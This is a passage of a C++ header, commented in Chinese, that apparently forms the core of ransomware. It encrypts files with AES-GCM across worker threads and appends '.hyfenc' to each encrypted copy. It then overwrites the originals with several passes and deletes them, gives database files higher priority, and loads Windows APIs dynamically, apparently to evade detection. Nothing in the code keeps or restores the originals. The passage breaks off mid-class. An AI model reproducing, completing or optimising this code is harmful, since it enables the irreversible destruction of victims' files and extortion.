// EncryptionUtils.h - 基于getapi.hpp的终极重构版 - GCM模式版本（线程安全修复版）
#pragma once
#ifndef TEX_H
#define TEX_H
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

// 修复：添加缺失的STATUS_SUCCESS定义
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
// 在 STATUS_SUCCESS 定义后添加
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif
// 修复：确保BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO宏存在
#ifndef BCRYPT_INIT_AUTH_MODE_INFO
#define BCRYPT_INIT_AUTH_MODE_INFO(_AuthInfo_) \
    do { \
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_STACK(_AuthInfo_); \
        (_AuthInfo_).dwInfoVersion = 1; \
        (_AuthInfo_).dwInfoVersionSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); \
    } while (0)
#endif

#ifndef ERROR_RESOURCE_DEADLOCK
#define ERROR_RESOURCE_DEADLOCK 0x4F
#endif

#include <Windows.h>
#include <algorithm>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include <future>
#include <optional>
#include <chrono>

#include "Message.h"
#include "getapi.h"
#include "rsa.h"

// 使用inline避免重复定义 - 修改为GCM模式参数
inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096;
inline constexpr DWORD KEY_LENGTH = 32;
inline constexpr DWORD IV_LENGTH = 12;
inline constexpr DWORD TAG_LENGTH = 16;
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64;
inline constexpr DWORD MAX_CONCURRENT_IO = 80;
inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024;
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15;
inline constexpr size_t CHUNK_SIZE = 1024 * 1024;
inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
inline constexpr DWORD IOCP_CONCURRENCY = 4;
inline constexpr DWORD AESNI_BATCH_SIZE = 8;
inline constexpr DWORD MAX_WORKER_THREADS = 64;
inline constexpr DWORD IO_THREADS = 4;
inline constexpr DWORD COMPUTE_THREADS = 16;
inline constexpr DWORD MANAGER_THREADS = 1;

// 新增：文件大小阈值常量
inline constexpr size_t MEMORY_MAPPED_THRESHOLD = 4 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_MANAGER_THREADS = 2;
inline constexpr size_t LARGE_FILE_MANAGER_THREADS = 8;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

// 使用getapi.hpp中的安全API调用宏
#define SAFE_CALL_API(func, ...) \
    (CHECK_API(func) ? func(__VA_ARGS__) : throw std::runtime_error("API not available: " #func))

#define CHECK_API(func) (func != nullptr)

// 增强版API检查宏
#define ENSURE_API_LOADED(func) \
    do { \
        if (!func) { \
            if (!g_DynamicAPIInitializer.IsInitialized()) { \
                throw std::runtime_error("Dynamic APIs not initialized"); \
            } \
            throw std::runtime_error("API function not loaded: " #func); \
        } \
    } while(0)

// 修复to_hex函数
inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << static_cast<unsigned long>(status);
    return ss.str();
}

// 前向声明
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key, bool useMemoryMapping = true);
bool SecureDelete(const fs::path& path);
bool EncryptFileWithMemoryMapping(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
bool EncryptFileWithAsyncIO(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
void GenerateRandomKey(BYTE* key, DWORD length);
bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
fs::path GetUserDocumentsPath();
bool IsAesNiSupported();
bool validateFileHeader(const fs::path& encryptedFile);
bool isFileLocked(const fs::path& filePath);
bool validateEncryptedFile(const fs::path& encryptedFile, const fs::path& originalFile);
// 在函数声明区域添加缺失的函数声明
bool SecureDeleteFilehf(const fs::path& filePath, int maxRetries = 3);
bool validateEncryptedFileStable(const fs::path& encryptedFile);

// GCM认证加密结构
struct GCM_ENCRYPT_RESULT {
    std::vector<BYTE> ciphertext;
    BYTE tag[TAG_LENGTH];
    bool success;
    NTSTATUS status;
};

// ==================== 线程局部存储的BCrypt上下文 ====================
struct ThreadLocalBCryptContext {
    BCRYPT_ALG_HANDLE algorithm{ nullptr };
    BCRYPT_KEY_HANDLE key{ nullptr };
    BYTE localIV[IV_LENGTH]{ 0 };
    BYTE localTag[TAG_LENGTH]{ 0 };
    std::atomic<size_t> blocksEncrypted{ 0 };
    std::atomic<double> encryptionTime{ 0.0 };

    ThreadLocalBCryptContext(const BYTE* keyMaterial) {
        NTSTATUS status = SAFE_CALL_API(pBCryptOpenAlgorithmProvider,
            &algorithm, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Algorithm init failed");

        const wchar_t gcmMode[] = BCRYPT_CHAIN_MODE_GCM;
        status = SAFE_CALL_API(pBCryptSetProperty, algorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(gcmMode)), sizeof(gcmMode), 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("GCM mode set failed");

        status = SAFE_CALL_API(pBCryptGenerateSymmetricKey, algorithm, &key,
            nullptr, 0, const_cast<BYTE*>(keyMaterial), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Key generation failed");
    }

    ~ThreadLocalBCryptContext() {
        if (key) SAFE_CALL_API(pBCryptDestroyKey, key);
        if (algorithm) SAFE_CALL_API(pBCryptCloseAlgorithmProvider, algorithm, 0);
    }

    ThreadLocalBCryptContext(const ThreadLocalBCryptContext&) = delete;
    ThreadLocalBCryptContext& operator=(const ThreadLocalBCryptContext&) = delete;
};

// ==================== 异步删除协调器 ====================
class AsyncDeletionCoordinator {
private:
    struct DeletionTask {
        fs::path originalFile;
        fs::path encryptedFile;
        int retryCount = 0;
        std::promise<bool> completionPromise;
        time_t scheduleTime;
    };

    std::queue<DeletionTask> deletionQueue_;
    mutable std::mutex queueMutex_;
    std::condition_variable queueCV_;
    std::atomic<bool> stopFlag_{ false };
    std::thread deletionThread_;

public:
    AsyncDeletionCoordinator() {
        deletionThread_ = std::thread([this] {
            deletionWorker();
            });
    }

    ~AsyncDeletionCoordinator() {
        stopFlag_.store(true);
        queueCV_.notify_all();
        if (deletionThread_.joinable()) {
            deletionThread_.join();
        }
    }

    std::future<bool> scheduleDeletion(const fs::path& original, const fs::path& encrypted) {
        DeletionTask task;
        task.originalFile = original;
        task.encryptedFile = encrypted;
        task.scheduleTime = time(nullptr);
        auto future = task.completionPromise.get_future();

        {
            std::lock_guard<std::mutex> lock(queueMutex_);
            deletionQueue_.push(std::move(task));
        }
        queueCV_.notify_one();
        return future;
    }

private:
    void deletionWorker() {
        while (!stopFlag_.load()) {
            DeletionTask task;
            {
                std::unique_lock<std::mutex> lock(queueMutex_);
                queueCV_.wait(lock, [this] {
                    return stopFlag_.load() || !deletionQueue_.empty();
                    });

                if (stopFlag_.load() && deletionQueue_.empty()) break;
                if (deletionQueue_.empty()) continue;

                task = std::move(deletionQueue_.front());
                deletionQueue_.pop();
            }
            performSafeDeletion(task);
        }
    }

    void performSafeDeletion(DeletionTask& task) {
        try {
            // 1. 验证加密文件完整性
            if (!validateEncryptedFileStable(task.encryptedFile)) {
                std::cerr << "Encrypted file validation failed, skipping deletion: "
                    << task.originalFile << std::endl;
                task.completionPromise.set_value(false);
                return;
            }

            // 2. 重试机制删除原始文件
            for (int attempt = 0; attempt < 3; ++attempt) {
                if (SecureDeleteFilehf(task.originalFile, 3)) {  // 修复：添加第二个参数
                    task.completionPromise.set_value(true);
                    std::cout << "Async deletion successful: " << task.originalFile << std::endl;
                    return;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(100 * (attempt + 1)));
                task.retryCount++;
            }

            std::cerr << "Async deletion failed after retries: " << task.originalFile << std::endl;
            task.completionPromise.set_value(false);
        }
        catch (const std::exception& e) {
            std::cerr << "Async deletion error: " << e.what() << std::endl;
            task.completionPromise.set_value(false);
        }
    }
};

// ==================== 修复的加密引擎 ====================
class EncryptionEngine {
private:
    BYTE masterKey[KEY_LENGTH];
    mutable std::mutex initMutex;
    std::atomic<bool> initialized{ false };

    // 线程局部存储的BCrypt上下文
    static thread_local std::unique_ptr<ThreadLocalBCryptContext> tlsContext;

public:
    bool initialize(const BYTE* encryptionKey) {
        std::lock_guard<std::mutex> lock(initMutex);
        if (initialized) return true;

        memcpy(masterKey, encryptionKey, KEY_LENGTH);
        initialized = true;

        std::cout << "Thread-safe GCM encryption engine initialized" << std::endl;
        return true;
    }

    ThreadLocalBCryptContext& getThreadContext() {
        if (!tlsContext) {
            tlsContext = std::make_unique<ThreadLocalBCryptContext>(masterKey);
        }
        return *tlsContext;
    }

    GCM_ENCRYPT_RESULT encryptGCM(const BYTE* input, size_t inputSize) {
        try {
            if (!initialized) {
                throw std::runtime_error("Encryption engine not initialized");
            }

            auto& ctx = getThreadContext();

            // 生成线程局部IV
            NTSTATUS status = SAFE_CALL_API(pBCryptGenRandom, nullptr,
                ctx.localIV, IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            if (!NT_SUCCESS(status)) {
                throw std::runtime_error("IV generation failed: " + to_hex(status));
            }

            // 准备GCM认证信息 - 使用线程局部缓冲区
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = ctx.localIV;
            authInfo.cbNonce = IV_LENGTH;
            authInfo.pbTag = ctx.localTag;
            authInfo.cbTag = TAG_LENGTH;

            // 加密数据 - 修复：添加const_cast
            std::vector<BYTE> ciphertext(inputSize);
            ULONG cbResult = 0;
            status = SAFE_CALL_API(pBCryptEncrypt, ctx.key,
                const_cast<PUCHAR>(input),  // 修复：添加const_cast
                static_cast<ULONG>(inputSize),
                &authInfo, nullptr, 0,
                ciphertext.data(),
                static_cast<ULONG>(inputSize),
                &cbResult, 0);

            if (!NT_SUCCESS(status)) {
                throw std::runtime_error("GCM encryption failed: " + to_hex(status));
            }

            if (cbResult != inputSize) {
                throw std::runtime_error("GCM size mismatch");
            }

            // 更新统计信息
            ctx.blocksEncrypted.fetch_add((inputSize + 15) / 16);

            GCM_ENCRYPT_RESULT result;
            result.ciphertext = std::move(ciphertext);
            memcpy(result.tag, ctx.localTag, TAG_LENGTH);
            result.success = true;
            result.status = STATUS_SUCCESS;

            return result;
        }
        catch (const std::exception& e) {
            std::cerr << "GCM encryption exception: " << e.what() << std::endl;
            GCM_ENCRYPT_RESULT result;
            result.success = false;
            result.status = STATUS_UNSUCCESSFUL;
            return result;
        }
    }

    void cleanup() {
        initialized = false;
        // 线程局部存储的清理在线程退出时自动进行
    }

    ~EncryptionEngine() {
        cleanup();
    }
};

// 定义线程局部变量
thread_local std::unique_ptr<ThreadLocalBCryptContext> EncryptionEngine::tlsContext = nullptr;

// ==================== 四层流水线架构 ====================
class UltimateEncryptionPipeline {
public:
    enum class PipelineStage {
        STAGE_IO_READ,
        STAGE_DATA_PREP,
        STAGE_ENCRYPTION,
        STAGE_COMMIT_WRITE,
        STAGE_SANITIZE
    };

    struct StageMetrics {
        std::atomic<size_t> filesProcessed{ 0 };
        std::atomic<size_t> bytesProcessed{ 0 };
        std::atomic<double> totalTimeMs{ 0.0 };
        std::atomic<double> peakThroughputMBs{ 0.0 };
    };

    class DiskDiscoverer {
    public:
        struct DiskInfo {
            std::wstring driveLetter;
            std::wstring type;
            uint64_t totalSize;
            uint64_t freeSize;
            bool isFixed;
            bool isNetwork;
            bool isRemovable;
        };

        std::vector<DiskInfo> discoverAllDisks() {
            std::vector<DiskInfo> disks;
            return disks;
        }
    };

    // I/O调度器 - 第一层
    class IOScheduler {
    public:
        struct FileTask {
            fs::path filePath;
            size_t fileSize;
            bool isDatabaseFile;
            int priority;
            time_t discoveryTime;

            bool operator<(const FileTask& other) const {
                if (priority != other.priority) return priority < other.priority;
                return fileSize < other.fileSize;
            }
        };

        void addFileTask(const fs::path& path, size_t size, bool isDB, int priority) {
            std::lock_guard<std::mutex> lock(queueMutex);
            taskQueue.push({ path, size, isDB, priority, time(nullptr) });
            queueCV.notify_one();
        }

        std::optional<FileTask> getNextTask() {
            std::unique_lock<std::mutex> lock(queueMutex);
            queueCV.wait(lock, [this] { return stop || !taskQueue.empty(); });
            if (stop && taskQueue.empty()) return std::nullopt;
            auto task = taskQueue.top();
            taskQueue.pop();
            return task;
        }

        void stopScheduler() {
            stop = true;
            queueCV.notify_all();
        }

        bool preloadFileData(const fs::path& path) {
            std::lock_guard<std::mutex> lock(cacheMutex);
            if (preloadCache.size() >= maxCacheSize) {
                preloadCache.erase(preloadCache.begin());
            }
            return true;
        }

        std::optional<std::vector<BYTE>> getPreloadedData(const fs::path& path) {
            std::lock_guard<std::mutex> lock(cacheMutex);
            auto it = preloadCache.find(path);
            if (it != preloadCache.end()) {
                auto data = std::move(it->second);
                preloadCache.erase(it);
                return data;
            }
            return std::nullopt;
        }

    private:
        std::priority_queue<FileTask> taskQueue;
        mutable std::mutex queueMutex;
        std::condition_variable queueCV;
        std::atomic<bool> stop{ false };
        std::map<fs::path, std::vector<BYTE>> preloadCache;
        mutable std::mutex cacheMutex;
        size_t maxCacheSize{ 1024 * 1024 * 256 };
    };

    // 数据锻造器 - 第二层
    class DataForge {
    private:
        class AlignedMemoryAllocator {
        public:
            static void* allocate(size_t size, size_t alignment = 64) {
                return _aligned_malloc(size, alignment);
            }

            static void deallocate(void* ptr) {
                _aligned_free(ptr);
            }
        };

        std::vector<void*> memoryPool;
        size_t poolSize{ 0 };
        mutable std::mutex poolMutex;

    public:
        void* allocateAligned(size_t size, size_t alignment = 64) {
            std::lock_guard<std::mutex> lock(poolMutex);
            for (auto it = memoryPool.begin(); it != memoryPool.end(); ++it) {
                if (_aligned_msize(*it, alignment, 0) >= size) {
                    void* ptr = *it;
                    memoryPool.erase(it);
                    return ptr;
                }
            }
            return AlignedMemoryAllocator::allocate(size, alignment);
        }

        void deallocateAligned(void* ptr, size_t alignment = 64) {
            std::lock_guard<std::mutex> lock(poolMutex);
            memoryPool.push_back(ptr);
            if (memoryPool.size() > 100) {
                AlignedMemoryAllocator::deallocate(memoryPool.front());
                memoryPool.erase(memoryPool.begin());
            }
        }

        void obfuscateData(BYTE* data, size_t size, const BYTE* key, uint64_t fileOffset) {
            for (size_t i = 0; i < size; ++i) {
                data[i] ^= key[(fileOffset + i) % KEY_LENGTH];
            }
        }
    };

    // 提交与清理层 - 第四层
    class CommitSanitizer {
    private:
        struct SanitizeTask {
            fs::path filePath;
            std::vector<BYTE> originalData;
            time_t scheduleTime;
            int priority;
        };

        std::queue<SanitizeTask> sanitizeQueue;
        mutable std::mutex queueMutex;
        std::condition_variable queueCV;
        std::atomic<bool> stop{ false };
        std::thread sanitizeThread;

    public:
        CommitSanitizer() {
            sanitizeThread = std::thread([this]() { sanitizeWorker(); });
        }

        ~CommitSanitizer() {
            stop = true;
            queueCV.notify_all();
            if (sanitizeThread.joinable()) {
                sanitizeThread.join();
            }
        }

        bool atomicFileReplace(const fs::path& tempFile, const fs::path& targetFile) {
            try {
                fs::create_directories(targetFile.parent_path());

                const int maxAttempts = 6;
                for (int attempt = 0; attempt < maxAttempts; ++attempt) {
                    HANDLE hTemp = SAFE_CALL_API(pCreateFileW,
                        tempFile.c_str(),
                        GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_FLAG_WRITE_THROUGH,
                        NULL);
                    if (hTemp != INVALID_HANDLE_VALUE) {
                        SAFE_CALL_API(pFlushFileBuffers, hTemp);
                        SAFE_CALL_API(pCloseHandle, hTemp);
                    }

                    BOOL success = ReplaceFileW(
                        targetFile.c_str(),
                        tempFile.c_str(),
                        nullptr,
                        REPLACEFILE_IGNORE_MERGE_ERRORS | REPLACEFILE_IGNORE_ACL_ERRORS,
                        nullptr, nullptr);

                    if (success) return true;

                    DWORD err = GetLastError();
                    std::cerr << "ReplaceFileW attempt " << (attempt + 1) << " failed, GetLastError=" << err
                        << " (temp=" << tempFile << ", target=" << targetFile << ")\n";

                    if (err == ERROR_FILE_NOT_FOUND) {
                        std::error_code ec;
                        fs::rename(tempFile, targetFile, ec);
                        return ec ? false : true;
                    }

                    if (err == ERROR_SHARING_VIOLATION || err == ERROR_LOCK_VIOLATION || err == ERROR_RESOURCE_DEADLOCK) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100 * (attempt + 1)));
                        continue;
                    }

                    std::cerr << "atomicFileReplace: unexpected ReplaceFileW error " << err << std::endl;
                    return false;
                }

                std::cerr << "atomicFileReplace: failed after retries for temp=" << tempFile << std::endl;
                return false;
            }
            catch (const std::exception& e) {
                std::cerr << "Atomic file replace failed: " << e.what() << std::endl;
                return false;
            }
        }

        void scheduleSanitize(const fs::path& filePath, const std::vector<BYTE>& originalData, int priority = 0) {
            std::lock_guard<std::mutex> lock(queueMutex);
            sanitizeQueue.push({ filePath, originalData, time(nullptr), priority });
            queueCV.notify_one();
        }

    private:
        void sanitizeWorker() {
            while (!stop) {
                SanitizeTask task;
                {
                    std::unique_lock<std::mutex> lock(queueMutex);
                    queueCV.wait(lock, [this] { return stop || !sanitizeQueue.empty(); });
                    if (stop && sanitizeQueue.empty()) break;
                    if (sanitizeQueue.empty()) continue;
                    task = sanitizeQueue.front();
                    sanitizeQueue.pop();
                }
                performSecureSanitize(task.filePath, task.originalData);
            }
        }

        void performSecureSanitize(const fs::path& filePath, const std::vector<BYTE>& originalData) {
            try {
                if (fs::exists(filePath)) {
                    std::cout << "Starting secure sanitize: " << filePath << std::endl;
                    if (!SecureDelete(filePath)) {
                        std::cerr << "Secure delete failed, trying alternative methods: " << filePath << std::endl;
                        fileShredder(filePath);
                    }
                    std::cout << "Secure sanitize completed: " << filePath << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Sanitize error for " << filePath << ": " << e.what() << std::endl;
            }
        }

        void fileShredder(const fs::path& filePath) {
            HANDLE hFile = INVALID_HANDLE_VALUE;
            int attempt = 0;
            const int maxAttempts = 3;

            while (attempt < maxAttempts) {
                try {
                    hFile = SAFE_CALL_API(pCreateFileW,
                        filePath.c_str(),
                        GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_FLAG_WRITE_THROUGH | FILE_FLAG_NO_BUFFERING,
                        NULL
                    );

                    if (hFile == INVALID_HANDLE_VALUE) {
                        throw std::runtime_error("Cannot open file for shredding");
                    }

                    LARGE_INTEGER fileSize;
                    if (!SAFE_CALL_API(pGetFileSizeEx, hFile, &fileSize)) {
                        throw std::runtime_error("Cannot get file size");
                    }

                    if (fileSize.QuadPart == 0) {
                        SAFE_CALL_API(pCloseHandle, hFile);
                        fs::remove(filePath);
                        return;
                    }

                    const int patterns[] = { 0x00, 0xFF, 0xAA, 0x55, 0x00 };
                    const int numPasses = sizeof(patterns) / sizeof(patterns[0]);
                    std::vector<BYTE> buffer(64 * 1024, 0);

                    for (int pass = 0; pass < numPasses; ++pass) {
                        std::fill(buffer.begin(), buffer.end(), patterns[pass]);
                        LARGE_INTEGER offset = { 0 };
                        LONGLONG remaining = fileSize.QuadPart;

                        while (remaining > 0) {
                            DWORD toWrite = static_cast<DWORD>(std::min(remaining, static_cast<LONGLONG>(buffer.size())));
                            DWORD written = 0;

                            if (!SAFE_CALL_API(pSetFilePointerEx, hFile, offset, NULL, FILE_BEGIN) ||
                                !SAFE_CALL_API(pWriteFile, hFile, buffer.data(), toWrite, &written, NULL) ||
                                written != toWrite) {
                                throw std::runtime_error("Write failed during shredding");
                            }

                            offset.QuadPart += toWrite;
                            remaining -= toWrite;
                        }
                        SAFE_CALL_API(pFlushFileBuffers, hFile);
                    }

                    SAFE_CALL_API(pCloseHandle, hFile);

                    if (!SAFE_CALL_API(pDeleteFileW, filePath.c_str())) {
                        fs::path tempPath = filePath;tempPath += ".shred";
                        fs::rename(filePath, tempPath);
                        fs::remove(tempPath);
                    }
                    return;
                }
                catch (const std::exception& e) {
                    if (hFile != INVALID_HANDLE_VALUE) SAFE_CALL_API(pCloseHandle, hFile);
                    attempt++;
                    if (attempt >= maxAttempts) {
                        std::error_code ec;
                        fs::remove(filePath, ec);
                        return;
                    }
                    Sleep(1000);
                }
            }
        }
    };

    // 主流水线控制器 - 线程安全修复版
    class PipelineController {
    private:
        IOScheduler ioScheduler;
        DataForge dataForge;
        EncryptionEngine encryptEngine;
        CommitSanitizer commitSanitizer;
        AsyncDeletionCoordinator asyncDeletionCoordinator;  // 新增异步删除协调器

        // 背压控制
        std::atomic<size_t> activeTasks_{ 0 };
        std::atomic<size_t> pendingIO_{ 0 };
        std::atomic<size_t> pendingEncryption_{ 0 };
        const size_t maxActiveTasks_{ 100 };
        const size_t maxPendingIO_{ 50 };
        const size_t maxPendingEncryption_{ 50 };

        std::atomic<bool> pipelineRunning{ false };
        std::vector<std::thread> workerThreads;
        std::atomic<size_t> totalFilesProcessed{ 0 };
        std::atomic<size_t> totalBytesProcessed{ 0 };
        StageMetrics stageMetrics[5];
        std::atomic<size_t> errorCount{ 0 };
        std::vector<fs::path> failedFiles;
        mutable std::mutex failedFilesMutex;
        std::atomic<size_t> totalProcessingTimeMs{ 0 };

        // 背压控制类
        class BackPressureGuard {
        private:
            PipelineController& controller_;
            bool ioGuard_{ false };
            bool encryptionGuard_{ false };

        public:
            BackPressureGuard(PipelineController& ctrl) : controller_(ctrl) {
                controller_.activeTasks_.fetch_add(1, std::memory_order_release);
            }

            ~BackPressureGuard() {
                controller_.activeTasks_.fetch_sub(1, std::memory_order_release);
                if (ioGuard_) {
                    controller_.pendingIO_.fetch_sub(1, std::memory_order_release);
                }
                if (encryptionGuard_) {
                    controller_.pendingEncryption_.fetch_sub(1, std::memory_order_release);
                }
            }

            bool acquireIO() {
                if (controller_.pendingIO_.load(std::memory_order_acquire) < controller_.maxPendingIO_) {
                    controller_.pendingIO_.fetch_add(1, std::memory_order_release);
                    ioGuard_ = true;
                    return true;
                }
                return false;
            }

            bool acquireEncryption() {
                if (controller_.pendingEncryption_.load(std::memory_order_acquire) < controller_.maxPendingEncryption_) {
                    controller_.pendingEncryption_.fetch_add(1, std::memory_order_release);
                    encryptionGuard_ = true;
                    return true;
                }
                return false;
            }

            bool canProceed() const {
                return controller_.activeTasks_.load(std::memory_order_acquire) < controller_.maxActiveTasks_;
            }
        };

    public:
        bool initializePipeline(const BYTE* encryptionKey) {
            if (!encryptEngine.initialize(encryptionKey)) {
                std::cerr << "Failed to initialize thread-safe GCM encryption engine" << std::endl;
                return false;
            }

            DWORD threadCount = std::min(std::thread::hardware_concurrency(), 8u);
            pipelineRunning = true;

            for (DWORD i = 0; i < threadCount; ++i) {
                workerThreads.emplace_back([this, i]() {
                    pipelineWorker(i);
                    });
            }

            std::cout << "Thread-safe GCM pipeline initialized with " << threadCount << " worker threads" << std::endl;
            return true;
        }

        void shutdownPipeline() {
            pipelineRunning = false;
            ioScheduler.stopScheduler();

            for (auto& thread : workerThreads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
            workerThreads.clear();

            encryptEngine.cleanup();
            std::cout << "Thread-safe GCM pipeline shutdown completed" << std::endl;
        }

        void addEncryptionTask(const fs::path& inputFile, const fs::path& outputFile, int priority = 0) {
            // 背压检查
            if (activeTasks_.load(std::memory_order_acquire) >= maxActiveTasks_) {
                std::cerr << "Backpressure: skipping task due to high load: " << inputFile << std::endl;
                return;
            }

            try {
                if (!fs::exists(inputFile)) {
                    std::cerr << "Input file does not exist: " << inputFile << std::endl;
                    return;
                }

                size_t fileSize = fs::file_size(inputFile);
                bool isDatabaseFile = isFileDatabaseType(inputFile);
                int calculatedPriority = calculatePriority(fileSize, isDatabaseFile, priority);

                ioScheduler.addFileTask(inputFile, fileSize, isDatabaseFile, calculatedPriority);

                std::cout << "Thread-safe GCM task added: " << inputFile << " (Size: " << fileSize
                    << ", Priority: " << calculatedPriority << ")" << std::endl;
            }
            catch (const std::exception& e) {
                std::cerr << "Error adding thread-safe GCM task: " << e.what() << std::endl;
            }
        }

        void waitForCompletion() {
            using namespace std::chrono_literals;
            const int stableChecksRequired = 4;
            const std::chrono::milliseconds interval(500);

            size_t lastCount = totalFilesProcessed.load();
            int stableCount = 0;

            while (true) {
                std::this_thread::sleep_for(interval);
                printProgress();

                size_t nowCount = totalFilesProcessed.load();

                if (nowCount != lastCount) {
                    lastCount = nowCount;
                    stableCount = 0;
                    continue;
                }

                if (!pipelineRunning) break;

                stableCount++;
                if (stableCount >= stableChecksRequired) break;
            }

            std::cout << "\nwaitForCompletion: exiting (processed=" << totalFilesProcessed.load() << ")\n";
        }

    private:
        void pipelineWorker(DWORD workerId) {
            std::cout << "Thread-safe GCM pipeline worker " << workerId << " started" << std::endl;

            while (pipelineRunning) {
                // 背压检查
                if (!canAcceptNewTask()) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    continue;
                }

                auto taskOpt = ioScheduler.getNextTask();
                if (!taskOpt) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    continue;
                }

                processFileTask(*taskOpt, workerId);
            }

            std::cout << "Thread-safe GCM pipeline worker " << workerId << " finished" << std::endl;
        }

        bool canAcceptNewTask() const {
            return activeTasks_.load(std::memory_order_acquire) < maxActiveTasks_ &&
                pendingIO_.load(std::memory_order_acquire) < maxPendingIO_ &&
                pendingEncryption_.load(std::memory_order_acquire) < maxPendingEncryption_;
        }

        void processFileTask(const IOScheduler::FileTask& task, DWORD workerId) {
            BackPressureGuard pressureGuard(*this);

            if (!pressureGuard.canProceed()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                return;
            }

            auto startTime = std::chrono::high_resolution_clock::now();
            bool encryptionSuccess = false;
            fs::path outputFile;
            std::vector<BYTE> originalDataBackup;

            try {
                if (!pressureGuard.acquireIO()) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(5));
                    return;
                }

                // 读取文件数据
                auto readData = readFileData(task.filePath, task.fileSize);
                if (!readData) {
                    throw std::runtime_error("Failed to read file data");
                }

                originalDataBackup = *readData;
                outputFile = task.filePath;
                outputFile += ".hyfenc";

                // 检查输出文件是否已存在
                if (fs::exists(outputFile)) {
                    std::cout << "Output file already exists, skipping: " << outputFile << std::endl;
                    return;
                }

                // 准备数据用于GCM加密
                auto forgedData = prepareDataForEncryption(*readData, workerId);
                if (!forgedData) {
                    throw std::runtime_error("Data preparation failed");
                }

                if (!pressureGuard.acquireEncryption()) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(5));
                    return;
                }

                // 执行GCM加密
                auto encryptedData = performGCMEncryption(*forgedData, task.fileSize, workerId);
                if (!encryptedData) {
                    throw std::runtime_error("GCM encryption failed");
                }

                // 提交加密数据
                if (commitEncryptedData(outputFile, *encryptedData)) {
                    encryptionSuccess = true;
                    std::cout << "Thread-safe GCM encryption completed successfully: " << outputFile << std::endl;

                    // 使用异步删除协调器
                    auto deletionFuture = asyncDeletionCoordinator.scheduleDeletion(task.filePath, outputFile);

                    // 异步等待删除结果（不阻塞流水线）
                    std::thread([deletionFuture = std::move(deletionFuture), originalFile = task.filePath]() mutable {
                        try {
                            bool deletionResult = deletionFuture.get();
                            if (deletionResult) {
                                std::cout << "Original file securely deleted: " << originalFile << std::endl;
                            }
                            else {
                                std::cerr << "Failed to securely delete original file: " << originalFile << std::endl;
                            }
                        }
                        catch (const std::exception& e) {
                            std::cerr << "Deletion future error: " << e.what() << std::endl;
                        }
                        }).detach();

                    // 更新统计信息
                    totalFilesProcessed++;
                    totalBytesProcessed += task.fileSize;

                    auto endTime = std::chrono::high_resolution_clock::now();
                    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);

                    stageMetrics[static_cast<int>(PipelineStage::STAGE_IO_READ)].bytesProcessed += task.fileSize;
                    stageMetrics[static_cast<int>(PipelineStage::STAGE_IO_READ)].totalTimeMs += duration.count() / 5.0;

                    stageMetrics[static_cast<int>(PipelineStage::STAGE_ENCRYPTION)].bytesProcessed += task.fileSize;
                    stageMetrics[static_cast<int>(PipelineStage::STAGE_ENCRYPTION)].totalTimeMs += duration.count() / 2.0;

                    if (totalFilesProcessed % 10 == 0) {
                        printProgress();
                    }
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Thread-safe GCM pipeline error: " << e.what() << std::endl;
                errorCount++;

                {
                    std::lock_guard<std::mutex> lock(failedFilesMutex);
                    failedFiles.push_back(task.filePath);
                }

                // 清理临时文件
                if (!outputFile.empty() && fs::exists(outputFile)) {
                    std::error_code ec;
                    fs::remove(outputFile, ec);
                }
            }

            // 更新总处理时间
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
            totalProcessingTimeMs += duration.count();
        }

